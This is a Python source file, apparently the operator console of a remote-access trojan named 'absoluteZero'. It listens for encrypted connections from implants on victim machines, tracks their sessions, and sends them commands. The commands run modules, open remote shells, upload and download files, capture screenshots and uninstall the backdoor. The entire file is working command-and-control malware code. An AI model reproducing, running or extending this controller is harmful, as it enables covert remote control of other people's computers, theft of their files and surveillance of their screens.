import select
import socket
import datetime
import base64
import struct
import sys
import os
import random
import io
from datetime import datetime

from core.data import viewbag
from core.color import color
from core.utils import tools
from core.console import help
from payloads.modules import shell
from payloads import modulehelper
from core.cryptography import crypto_aes
from core.data import ebytes


class Helper:
    def __init__(self):
        self.shell_ip = '127.0.0.1'

    @staticmethod
    def ShellHandler(index, connection, shell_ip):
        while True:
            shell_port = (random.randint(1000, 65535))
            if shell_port in viewbag.PORT_LIST:
                continue
            else:
                print color.ReturnInfo("New channel created.")
                print color.ReturnInfo("Deploying shell %s:%s => %s:%s" % (
                    viewbag.CALLBACK_IP, str(shell_port), viewbag.all_addresses[index][0],
                    viewbag.all_addresses[index][1]))
                plugin = base64.b64encode('exec' + '+' * 5 + shell.run(shell_port).replace('<cip>', shell_ip))
                Helper.send_msg(connection, plugin)
                shell.bind(shell_port)
                break

    @staticmethod
    def Broadcast(string_):
        try:
            for connection in viewbag.all_connections:
                Helper().send_msg(string_)
        except Exception, e:
            print color.ReturnError('Broadcast error -> "%s"' % str(e))

    @staticmethod
    def InitializePorts(ports):
        try:
            viewbag.PORT_LIST = []
            for port in ports.split(','):
                viewbag.PORT_LIST.append(int(port))
                return 'CALLBACK_PORTS => %s' % ports
        except Exception, e:
            print color.ReturnError('InitializePorts -> ' + str(e))

    @staticmethod
    def DisconnectImplants():
        for index, conn in enumerate(viewbag.all_connections):
            try:
                Helper.send_msg(conn, ebytes.EBYTES.break_byte)
            except socket.error:
                continue

    @staticmethod
    def InitializeIp(ip):
        try:
            viewbag.CALLBACK_IP = ip
            return 'CALLBACK_IP => %s' % ip
        except Exception, e:
            print color.ReturnError('InitializeIp -> ' + str(e))

    @staticmethod
    def GetPrintablePorts():
        bf = ''
        for port in viewbag.PORT_LIST:
            bf += str(port) + ','
        return bf[:-1]

    @staticmethod
    def send_msg(sock, msg):
        msg = crypto_aes.AESCipher(crypto_aes.uniqueKey).encrypt(msg)
        msg = struct.pack('>I', len(msg)) + msg
        sock.sendall(msg)

    @staticmethod
    def send_msg_noenc(sock, msg):
        msg = base64.b64encode(msg)
        msg = struct.pack('>I', len(msg)) + msg
        sock.sendall(msg)

    @staticmethod
    def recv_msg(sock):
        # Read message length and unpack it into an integer
        raw_msglen = Helper.recvall(sock, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return crypto_aes.AESCipher(crypto_aes.uniqueKey).decrypt(Helper.recvall(sock, msglen))

    @staticmethod
    def recv_msg_noenc(sock):
        # Read message length and unpack it into an integer
        raw_msglen = Helper.recvall(sock, 4)
        if not raw_msglen:
            return None
        msglen = struct.unpack('>I', raw_msglen)[0]
        # Read the message data
        return base64.b64decode(Helper.recvall(sock, msglen))

    @staticmethod
    def recvall(sock, n):
        # Helper function to recv n bytes or return None if EOF is hit
        data = b''
        while len(data) < n:
            packet = sock.recv(n - len(data))
            if not packet:
                return None
            data += packet
        return data

    @staticmethod
    def ListSessions():
        buffer_row = []
        implants = []
        headers = ['Id', 'Hash', 'Connected', 'Ip', 'Port', 'Implant Name', 'Os', 'Arch']
        for index, conn in enumerate(viewbag.all_connections):
            try:
                Helper.send_msg(conn, ebytes.EBYTES.command_handling_byte)
                if Helper.recv_msg(conn) == ebytes.EBYTES.list_session_byte:
                    timeago = datetime.now() - viewbag.all_times[index]
                    buffer_row.append(str(index))
                    buffer_row.append(viewbag.all_hashes[index])

                    buffer_row.append("%.2dh:%.2dm:%.2ds ago " % (
                        timeago.seconds // 3600, (timeago.seconds // 60) % 60, timeago.seconds % 60))

                    buffer_row.append(
                        "tcp://%s:%s" % (viewbag.all_addresses[index][0], viewbag.all_addresses[index][1]))

                    buffer_row.append("%s" % viewbag.all_rport[index])
                    buffer_row.append(viewbag.all_names[index])
                    buffer_row.append(viewbag.all_os[index])
                    buffer_row.append(viewbag.all_arch[index])
                    implants.append(buffer_row)
            except socket.error:
                Helper.RemoveSession(index)
                continue
        return '\n' + color.ReturnTabulate(implants, headers, "simple") + '\n'

    @staticmethod
    def StartTcpHandler():
        try:
            # Initialize cryptography
            print color.ReturnInfo('Setting up AES keys for encrypted connection..')
            crypto_aes.initKey()
            print color.ReturnSuccess('Ready for the encrypted communication.')

            # Load ports and start socket server
            for port in viewbag.PORT_LIST:
                ds = (viewbag.CALLBACK_IP, port)
                server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server.bind(ds)
                server.listen(viewbag.MAX_CONN)
                viewbag.SERVERS.append(server)
            while True:
                readable, _, _ = select.select(viewbag.SERVERS, [], [])
                ready_server = readable[0]
                connection, address = ready_server.accept()
                connection.setblocking(1)
                implanthash = tools.GetUniqueHashFromString(address[0])
                implantnow = datetime.now()

                viewbag.all_addresses.append(address)
                viewbag.all_connections.append(connection)
                viewbag.all_hashes.append(implanthash)
                viewbag.all_times.append(implantnow)
                viewbag.all_rport.append(ready_server.getsockname()[1])

                # Setup encrypted connection with the new implant
                connection.send(base64.b64encode(crypto_aes.uniqueKey))

                name, os_, arch = Helper.recv_msg(connection).split(viewbag.SPL)
                viewbag.all_names.append(name)
                viewbag.all_os.append(os_)
                viewbag.all_arch.append(arch)

                if viewbag.NOTIFY_CONNECTION:
                    print '\n' + color.ReturnSuccess('New implant connected %s/%s (%s)' % (address[0], name, os_))

                implant_folder = viewbag.ENVIRONMENT_FOLDER + '\\' + address[0] + "_" + name + "\\"
                tools.mkdir(implant_folder)
                viewbag.all_folders.append(implant_folder)

        except Exception as e:
            print color.ReturnError('StartTcpHandler -> ' + str(e))

    @staticmethod
    def RemoveSession(index):
        del viewbag.all_connections[index]
        del viewbag.all_addresses[index]
        del viewbag.all_hashes[index]
        del viewbag.all_rport[index]
        del viewbag.all_times[index]
        del viewbag.all_os[index]
        del viewbag.all_names[index]
        del viewbag.all_arch[index]
        del viewbag.all_folders[index]

    @staticmethod
    def Parse(data_to_forward):
        try:
            if data_to_forward.startswith('exec '):
                module_and_command = data_to_forward.split(' ')[1]
                module = module_and_command.split('::')[0]
                command = module_and_command.split('::')[1]
                if not module.split('/')[1] in modulehelper.MODULES:
                    print color.ReturnError('Module "%s" not found.' % module)
                    return ebytes.EBYTES.ping_byte
                payload = modulehelper.GetPayload(module, command)
                if payload != ebytes.EBYTES.break_byte:
                    return payload
                else:
                    return ebytes.EBYTES.ping_byte
            else:
                return base64.b64encode(data_to_forward)
        except IndexError:
            print color.ReturnError('Module execution error "%s" : wrong module name or parameter.' % data_to_forward)
            return ebytes.EBYTES.ping_byte
        except Exception, e:
            print color.ReturnError('Command "%s" unrecognized (%s).' % (data_to_forward, str(e)))
            return ebytes.EBYTES.ping_byte

    @staticmethod
    def KillImplant(index):
        try:
            Helper.send_msg(viewbag.all_connections[index], ebytes.EBYTES.exit_byte)
        except socket.error as e:
            color.ReturnError("Can't kill session '%s' -> " + str(e))
            Helper.RemoveSession(index)

    @staticmethod
    def ImplantInteraction(index):
        print color.ReturnInfo('Deploying meta interpreter => tcp://%s:%s' % (
            viewbag.all_addresses[index][0], viewbag.all_addresses[index][1]))
        connection = viewbag.all_connections[index]
        print color.ReturnInfo('Pinging Backdoor ...')

        try:
            Helper.send_msg(connection, ebytes.EBYTES.ping_byte)
            if Helper.recv_msg(connection) == ebytes.EBYTES.command_handling_byte:
                print color.ReturnSuccess('Backdoor returned code "\\x06", success.\n')
                while True:
                    sys.stdout.write(color.ReturnImplantConsole('absoluteZero'))
                    command = raw_input('')

                    if command == "exit":
                        if tools.Confirm('Close the current implant session?'):
                            Helper.send_msg(connection, ebytes.EBYTES.exit_byte)
                            print ''
                            print color.ReturnError('Meta interpreter sessions closed => tcp://%s:%s' % (
                                viewbag.all_addresses[index][0], viewbag.all_addresses[index][1]))
                            break
                        else:
                            continue
                    elif command == "background":
                        raise KeyboardInterrupt
                    elif command == "uninstall":
                        if tools.Confirm('Uninstall the implant from this target?'):
                            Helper.send_msg(connection, ebytes.EBYTES.uninstall_byte)
                            print ''
                            print color.ReturnError('Meta interpreter sessions closed => tcp://%s:%s' % (
                                viewbag.all_addresses[index][0], viewbag.all_addresses[index][1]))
                            print color.ReturnWarning('Uninstalling implant => tcp://%s:%s' % (
                                viewbag.all_addresses[index][0], viewbag.all_addresses[index][1]))

                            if Helper.recv_msg(connection) == ebytes.EBYTES.confirm_uninstall_byte:
                                print color.ReturnSuccess('Implant uninstalled successfully.\n')
                            break
                        else:
                            continue
                    elif command == "modules":
                        print "\n" + color.ReturnTabulate(modulehelper.ListModules(), ['Name', 'Description'],
                                                          "simple") + "\n"
                        continue
                    elif command.startswith('download'):
                        try:
                            _, file_to_download, destination_folder = command.split(' ')
                            if not os.path.isdir(destination_folder):
                                print color.ReturnError("Error: folder '%s' doesn't exists." % destination_folder)
                                continue
                            else:
                                if destination_folder[-1:] == "\\" or destination_folder[-1:] == "/":
                                    pass
                                else:
                                    destination_folder += "\\"
                        except ValueError:
                            print color.ReturnError(
                                'Wrong arguments, Syntax: download <remote_file_path> <destination_folder_path>')
                            continue
                        Helper.send_msg(connection, base64.b64encode('download ' + file_to_download))
                        check = Helper.recv_msg(connection)
                        print ''
                        if check == ebytes.EBYTES.exit_byte:
                            dst = destination_folder + os.path.basename(file_to_download)
                            print color.ReturnInfo('Downloading: %s -> %s' % (file_to_download, dst))
                            Helper.send_msg(connection, ebytes.EBYTES.confirmation_byte)
                            file_content = Helper.recv_msg_noenc(connection)
                            try:
                                if os.path.isfile(dst):
                                    os.remove(dst)
                                f = open(dst, 'wb')
                                f.write(file_content)
                                f.close()
                                print color.ReturnSuccess('Downloaded: %s -> %s\n' % (file_to_download, dst))
                            except IOError as e:
                                print color.ReturnError(
                                    'Download error: Permission denied for folder -> "%s"\n' % destination_folder)
                            except Exception, e:
                                print color.ReturnError('Download error: %s\n' % str(e))
                            continue
                        elif check == ebytes.EBYTES.error_byte:
                            print color.ReturnError('Error: file "%s" not found.\n' % file_to_download)
                            continue
                    elif command.startswith('upload'):
                        try:
                            _, file_to_upload, destination_folder = command.split(' ')
                            if os.path.isfile(file_to_upload):
                                if destination_folder[-1:] == "\\" or destination_folder[-1:] == "/":
                                    pass
                                else:
                                    destination_folder += "\\"

                                Helper.send_msg(connection, base64.b64encode(
                                    'upload ' + destination_folder + os.path.basename(file_to_upload)))
                                check = Helper.recv_msg(connection)
                                if check == ebytes.EBYTES.exit_byte:
                                    try:
                                        print ''
                                        print color.ReturnInfo('Uploading: %s -> %s' % (
                                            file_to_upload, destination_folder + os.path.basename(file_to_upload)))
                                        f = open(file_to_upload, 'rb')
                                        content = f.read()
                                        f.close()
                                        Helper.send_msg_noenc(connection, content)
                                        output_byte = Helper.recv_msg(connection)
                                        if output_byte != ebytes.EBYTES.confirmation_byte:
                                            print color.ReturnError(output_byte)
                                        else:
                                            print color.ReturnSuccess('Uploaded: %s -> %s\n' % (
                                                file_to_upload, destination_folder + os.path.basename(file_to_upload)))
                                            continue
                                    except Exception, e:
                                        Helper.send_msg(connection, ebytes.EBYTES.error_byte)
                                        print color.ReturnError(
                                            "Error uploading file '%s' -> %s\n" % (file_to_upload, str(e)))
                                        continue
                                else:
                                    print color.ReturnError(
                                        'Something wrong while uploading file "%s"\n' % file_to_upload)
                                    continue
                            else:
                                print color.ReturnError("File '%s' doesn't exists.\n" % file_to_upload)
                                continue
                        except ValueError:
                            print color.ReturnError(
                                'Wrong arguments, Syntax: upload <local_file_path> <destination_folder_path>')
                            continue
                    elif command == "screenshot":
                        Helper.send_msg(connection, base64.b64encode(command))
                        check = Helper.recv_msg(connection)
                        dst = viewbag.all_folders[index] + datetime.today().strftime('%Y_%m_%d-%H_%M_%S.png')
                        print ''
                        if check == ebytes.EBYTES.exit_byte:
                            print color.ReturnInfo('Downloading screenshot...')
                            Helper.send_msg(connection, ebytes.EBYTES.confirmation_byte)
                            file_content = Helper.recv_msg(connection)
                            try:
                                f = open(dst, 'wb')
                                f.write(file_content)
                                f.close()
                                print color.ReturnSuccess('Screenshot saved: %s\n' % dst)
                            except Exception, e:
                                print color.ReturnError('Screenshot error: %s\n' % str(e))
                            continue
                        else:
                            print color.ReturnError('Screenshot error: %s\n' % str(check))
                    elif command == "help":
                        print help.help()
                    else:

                        if 'admin/shell::' in command:
                            if not 'admin/shell_exec::' in command:
                                Helper.send_msg(connection, ebytes.EBYTES.host_byte)
                                Helper.shell_ip = Helper.recv_msg(connection)
                                Helper.ShellHandler(index, connection, Helper.shell_ip)

                                # Useless but necessary return Value from function
                                Helper.recv_msg(connection)
                                continue
                        data_to_forward = Helper().Parse(command)
                        Helper.send_msg(connection, data_to_forward)

                        data_from_implant = Helper.recv_msg(connection)

                        if command == 'exec admin/ls::':
                            dir_entry = []
                            for line in data_from_implant.split(';;;;'):
                                try:
                                    buffer_row = []
                                    name, typ, siz, lastmodify = line.split('::')
                                    buffer_row.append(name)
                                    buffer_row.append(typ)
                                    buffer_row.append(tools.sizeof_fmt(int(siz)))
                                    buffer_row.append(lastmodify)
                                    dir_entry.append(buffer_row)
                                except ValueError:
                                    pass
                            data_from_implant = "\n" + color.ReturnTabulate(dir_entry,
                                                                            ['Name', 'Type', 'Size', 'Last Modify'],
                                                                            "simple") + "\n"
                        elif command == 'exec admin/ps::':
                            ps_entry = []
                            for proc in data_from_implant.split(':::::'):
                                try:
                                    buffer_row = []
                                    name, pid, path = proc.split('###')
                                    buffer_row.append(name)
                                    buffer_row.append(pid)
                                    buffer_row.append(path)
                                    ps_entry.append(buffer_row)
                                except ValueError:
                                    pass
                            data_from_implant = "\n" + color.ReturnTabulate(ps_entry,
                                                                            ['Name', 'PID', 'Path'],
                                                                            "simple") + "\n"
                        elif command == 'exec admin/sysinfo::':
                            data_from_implant = "\n" + data_from_implant.replace('xxx', '\n').replace('<prc>',
                                                                                                      '%') + "\n"

                        elif data_from_implant.startswith('+'):
                            data_from_implant = color.ReturnSuccess(data_from_implant.replace('+ ', ''))
                        elif data_from_implant.startswith('-'):
                            data_from_implant = color.ReturnError(data_from_implant.replace('- ', ''))
                        elif data_from_implant.startswith('*'):
                            data_from_implant = color.ReturnInfo(data_from_implant.replace('* ', ''))

                        print data_from_implant

                        if viewbag.MESSAGE_LENGTH_SHOW:
                            print color.ReturnMsgLength(tools.sizeof_fmt(len(data_from_implant)))

        except KeyboardInterrupt:
            print color.ReturnWarning('Session moved to the background.')
        except socket.error as e:
            print color.ReturnError(
                'Remote host "%s" has closed the connection.' % str(viewbag.all_addresses[index][0]))
            Helper.RemoveSession(index)
            return False
        except IOError as e:
            Helper.RemoveSession(index)
            print color.ReturnError('IOError -> ' + str(e))
            return False
        except Exception as e:
            if "10054" in str(e):
                print color.ReturnError('Backdoor is not responding, the connection has been closed (10054).')
            else:
                print color.ReturnError(
                    'Unhandled exception -> %s.' % str(e))
            Helper.RemoveSession(index)
            return False
